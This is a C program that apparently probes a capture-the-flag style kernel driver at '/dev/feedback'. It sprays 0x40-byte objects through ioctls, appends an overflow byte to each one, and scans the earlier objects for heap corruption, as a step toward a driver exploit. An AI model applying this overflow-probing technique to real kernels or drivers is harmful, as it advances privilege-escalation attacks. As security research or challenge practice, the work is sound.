#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) {
        perror("malloc");
        exit(1);
    }
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;

    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_fb(int fd, uint64_t id, char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = out };
    return xioctl(fd, CMD_READ, &req);
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const int n = 220;
    const uint64_t base = 0x700000;
    char out[0x80];
    int created = 0;

    puts("[+] create size=0x40 objects and rescan liveness each step");
    for (int i = 0; i < n; i++) {
        uint64_t id = base + (uint64_t)i;
        unsigned char fill = (unsigned char)(0x20 + (i % 90));
        unsigned char ov = (unsigned char)i;

        if (create_fb(fd, id, 0x40, fill, ov) != 0) {
            printf("create fail i=%d errno=%d\n", i, errno);
            break;
        }
        created++;

        int bad_meta = 0;
        int bad_data = 0;
        for (int j = 0; j <= i; j++) {
            uint64_t oid = base + (uint64_t)j;
            unsigned char expected = (unsigned char)(0x20 + (j % 90));
            int rc = read_fb(fd, oid, out, sizeof(out));
            if (rc != 0) {
                bad_meta++;
                continue;
            }
            if ((unsigned char)out[0] != expected) {
                bad_data++;
            }
        }

        if (bad_meta || bad_data) {
            printf("step=%d ov=0x%02x bad_meta=%d bad_data=%d\n", i, ov, bad_meta, bad_data);
            int shown = 0;
            for (int j = 0; j <= i && shown < 8; j++) {
                uint64_t oid = base + (uint64_t)j;
                unsigned char expected = (unsigned char)(0x20 + (j % 90));
                int rc = read_fb(fd, oid, out, sizeof(out));
                if (rc != 0) {
                    printf("  meta? id=%llu rc=%d errno=%d\n", (unsigned long long)oid, rc, errno);
                    shown++;
                } else if ((unsigned char)out[0] != expected) {
                    printf("  data  id=%llu expect=0x%02x got=0x%02x\n",
                           (unsigned long long)oid, expected, (unsigned char)out[0]);
                    shown++;
                }
            }
        }

        if ((i % 32) == 0) {
            printf(".. progress i=%d\n", i);
        }
    }

    puts("[+] cleanup");
    for (int i = 0; i < created; i++) {
        del_fb(fd, base + (uint64_t)i);
    }

    close(fd);
    puts("[+] done");
    return 0;
}
